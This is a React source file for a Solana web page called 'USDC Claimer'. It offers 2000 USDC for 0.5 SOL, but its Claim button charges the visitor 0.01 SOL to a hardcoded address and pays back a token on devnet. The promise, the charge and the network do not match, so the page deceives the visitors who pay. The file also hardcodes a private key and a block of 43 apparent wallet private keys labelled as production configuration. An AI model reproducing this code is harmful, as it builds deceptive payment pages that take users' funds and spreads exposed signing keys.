/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4237rpLAfzWq2XwrozajXGcEDFHSFXe2H3uBNCco95S3paxCqKNpoFVGmc4D95fa9zD4BwrpBoKwpVr2qpNrRn1j"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3m2VDoVSzekQkpXiwpTXhpLinpv6HGYFDCG4eMxqHmaK52NeU2f74aVsUXegknhrWV7KzVvhJeGGTzM11jwLnee9",
  "key1": "4xL1UytycQ1xZuXRoA4BKymkdscwAYq5RYoavatLRZ1czGZcosDaukkwQbW94MRBeZbSuLLNjG82EbVw9XhZMwZC",
  "key2": "4LwtxtV3973A34ZKozSgNgUPRGEQJbhyScF8rkuSpwVtgSLQ4ZRVkPB6awvQGy8pzALHszGNisrwYdAR56NcrsxP",
  "key3": "xawaF9ns9DMFRRFdchEuy4AANbMvrtxGmPtYd2MZ3FMcRJURFKoQ2j6fxmM2jSE2WexwGXTLyxdNgJp8vRvJ6BT",
  "key4": "d9bmG1mSSdCpay179cCZoVNoJMUZ4Smed6PJHcSRRqFwbxEkikbzrDi5JsgjXeirSiSiSoHeJv7HBZ3i4U1tjEP",
  "key5": "3d5rWCV3hKABhLtPQ58zFH8H6d1xQ8BFD6XuRFQMyZJ2ThD94MEij2tPP4cJJV94C9KUwXUBywXLapn3zBEcXWXR",
  "key6": "61sdACvgXLb5D97bmpeApao4gMxakkni5peR9YoeaPJMSdrzus7ytAJSnjrKXFckaDbiLs2M3nfQakDweMH5uVr",
  "key7": "3p31tajqL51tXyJdcj79YuAQ7ZZhZbLa98f5kSe9y26t7jWT6CQ1hGMS153GRASmcekfwFVaxNA2d5AdDBZfjm1g",
  "key8": "2WK8tyQWN5CZVQDJtFm6u2d9C2DDB9WB6KiwkMwJGgmLFDGB5gz8JBH5Q4dc8N6pPFBsf4EBhYQbgJ7gVQZZdGDU",
  "key9": "4bLwH26keA5bH3LvKw21ytm5VdiXuoqaRJyuyid7wntt3uRv9ed5eaYhPLz7Rx8uQqY4i1DuHmVNyocRSX5YEzwz",
  "key10": "3NLmMEAgvQZwUa1mSa48WMjKScjgnvKxBia3kh3XcpQAm4x6ACZ1bLW9csjcA5xeR8TeDXyeSx76nbeW5FbJzKu2",
  "key11": "fQbLXwnMtwSg3JxUdM6yevXpVhxjDiTM6F4KavtBdJjAZSrzpSD2EBb1Gbb4ADYY229aEWuBQPwdjsudsQSn8Qh",
  "key12": "UPVzwztcw1rEFmftM3nUMttpJdRzzHpiVYWFWv6BbiUJqZJnwoXwN1K46HJzhddncm689C4j4q9jKm4fbDuruiT",
  "key13": "3MG2ett8mN4xhZEib4B3BPjkBGUVV3mZtU3aW9DqxgQYfcM5F26CNzT7aiWDsu9SwrUWVV38GX766BfDMNDogX4W",
  "key14": "4p6P3RQhe62sVtN8q1hEbDNnkkuihJJVrhUhbK3v8ZfJAduC9GTee3j4Kxz3QkVabqQE6mQZoARaiZZxXDCg51jo",
  "key15": "4KK6SKPr2w5TuXJpwPPiZZcD4CzhS2rUNX6qk3CTMAKDkQxhhXkPTJXW1sN5tgeGAaL99DbUmmCuFmNrHt8FLXfw",
  "key16": "3xLjYTgNW9Ufp7jhyoPx9C7G46jNEbhWj44sMRpCf1jK2Aa2rsnJMx5LX4a44PrHXqcEW2ygFTgzjdWUiSmhoWRC",
  "key17": "3YzvY9H2wrwhArQwMPAfdsK7dggbQp8bLVHo2QKmLdHwCsSGbBJBi1e8fo91tpVvUZsRgLCVyfuDLzj93FDeqvXS",
  "key18": "37vNBWkjWPQGcAxcKknQQ4pP5GFpTT598fLpRBjJg4keBh8FM3NACv97oAXXcUvXztv4pXY6Wu92i79GyGzaRiBf",
  "key19": "5JjDBSctMERbMrVXwrMpMNrFtNkTiTRbWsvJc8wB5cV9NKKKKgD5eGymCEKNPGN8Uwg6d1fM5LRvpTpWVxYCERCd",
  "key20": "4VfzjuyU2jyfQ3hmK9gk91trjZRzZNvYas4pwCpiVUr4Tit26FHu3npN6U2aT1Uir3T5epwaCjQZ6XoWrT1B3PPu",
  "key21": "5XFkejyySjUt5NBHxgLSTs6P9ZVVoW2z7egh1GUBEk6nuPATn5XWwLk2bwSK6gFAtnhDDzTgSroGMynmVAVpEg1S",
  "key22": "5NoA33E3CrvQQESSK8QA27wwMhX3rmiCvYZ1oWC5dfRyLMdDhdyDHh2k11WM9nyDrB6LryNTT2dn4acG2ykfpzYm",
  "key23": "zWskAHUyoDN4DFArveUtozDvnqdGFQqo5cLoFDrkww9KcX2jPtkZMJMGpNHdX3Wu5enPpT7WbP6QnvMMPaNb9Jc",
  "key24": "5zrD4pf5nqET73Cz2TiAxJkaAX9rTyLnH2c84dkpm1MCy8LKMTBUmrPS83AZkaW3pmEHP1SD4Pbt5YkFJre48LtA",
  "key25": "4hg7ru9goJLArDN3DwcrBcHfAguUxCRVygjZNQgdXtE8V55wVxz8rtxGVgQtjJ69ccKrt8EZeUuXevdghjsUuH21",
  "key26": "FfZFpYQ4Hxd6RBgADvQYDBkwT1bD7rCYNnSvgrADZyMjrrq1uE2D8NoKSPjtGoqzRDV7VqjmkqLiaj7r5bQdgaC",
  "key27": "4s3AXGfUtKoPeTewyaJwAQtfVYhh3WuDVZEwn3EYMCB2fMB73mKDFaZpazvFBmYtAyCHKJEEtk3NQXqgr45xPhFd",
  "key28": "NRbLficsTzJH1EV95B5fb14KcyT4fj7gMFAMEAromBk1hkxqNH9ffVyMakLiYw1SCAdaUUXyAUgj8vMKsbqF9Pz",
  "key29": "2xv823kfvek2U31sSgqRxPRjnYwfXNgQdZTqsq7JeV99euCHAWmKgEzUfAzBD6wJEonM3iVpCgXh3dbx4bxZydeJ",
  "key30": "327Uvg9fMVFpABnZi3JtwZJr8tLdZfWQmXekNoGfq8G1nmSVP4SBNrb95nGi2B2CsdJPTwLpjaB8Dcq5SGhDpm5u",
  "key31": "2stiXErX1qKwKrLkcecVWyUQ2wevxoDk34EtEnCk8KZgRrtqQrk5rg6K2Qf3HaTAf2Zc98w8yNvSsTezXykFg5f9",
  "key32": "4tWuG4dViZwmLTwgPaeKQpQz2zxudN6gzAsPF8Hu5oAvG3GGxnvn1RVAxF4ubn2bThvhTndcqeiiqjytCGzVSv4D",
  "key33": "3irJ4EyHZS4hpyPxRofBNnWxt4Kt5oa4yxJYHHcDyuvkoj5azk1wHESXDwmhdZSZb2weRqABkAk4Ns2CeCTaTKsE",
  "key34": "jqpggMko7Z1cKs2xkeNbjbXm6ZQJAGcrPJXGrXgp7LPde6mjdwAaPFwL3puBTaPEnZ1XiG5VcdYYNKZG2haKtV4",
  "key35": "2uEHE5etNLRtLL4hAU12dgr99smCtQ3icHMAyqrHhmor6w5tSxdfQje6LVwTvbsKSj64Pyim7DqKQX9YNsnBW8B9",
  "key36": "DyR3y72S7DgCsQoeRrmuztNcWqwmdspJy4RSGEWxqRxDACVBXzcMHn2pgVWSZMkR2GkN3WY64vZBofWySMcXTKy",
  "key37": "3EzAVVsBZTPnwBKvSCkND384m4bkzFDcQTJmmdPsy5hzQAHW7hsfwK8E6YGD4zyLSquqNpYqtN1N5ATAAd9Etq8e",
  "key38": "YHiouuGuLU1eAsA3JuBY3GPhoJDHKfuQ5YiwrA9GNRvhGv2KSFLU752Hohveoqmg5epRa97rYMGYGUsefm63svd",
  "key39": "4DF1XmdKT3E99i34jVJmwzmxge84bnT8BtCiyypcmD3QUp9Qk6SiXyF9BqDw6cWCX3uckqyGFZ1exMPN2h4nrdEF",
  "key40": "2AoJHf6uRRsJn6UwTUWSkdVqiWGeT8ptL6AisqpoEUu4SEUceZBYoD6mTCoioMLKGjEvVwVXPu6oFymR93rcsTTh",
  "key41": "4CRrAAcRLiBiUsaJ9V8EnoX9oVdph91uDfm4VQhsDp74hXR1tY71YsKaJRdAZkNazQJANBY8RU1hRZDs1UsbRZfv",
  "key42": "MGCkPcxu3TDgRdAmcTZpu6u8fkkJNXeQiExyYPgr8xeR21P61g4sRALvDAEGp7ySHm2GR7c1RqPhfgEor2ZkZKE"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
